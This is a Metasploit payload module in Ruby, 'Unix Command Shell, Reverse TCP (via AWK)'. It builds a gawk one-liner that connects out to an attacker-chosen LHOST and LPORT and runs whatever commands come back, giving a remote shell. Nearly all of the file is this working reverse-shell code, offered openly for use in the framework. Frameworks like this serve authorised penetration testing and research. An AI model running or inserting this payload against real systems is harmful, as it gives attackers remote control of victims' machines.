##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 150

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP (via AWK)',
      'Description'   => 'Creates an interactive shell via GNU AWK',
      'Author'        =>
        [
          'espreto <robertoespreto[at]gmail.com>',
          'Ulisses Castro <uss.thebug[at]gmail.com>',
          'Gabriel Quadros <gquadrossilva[at]gmail.com>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'gawk',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "awk 'BEGIN{s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\");close(s)}}'"
  end
end
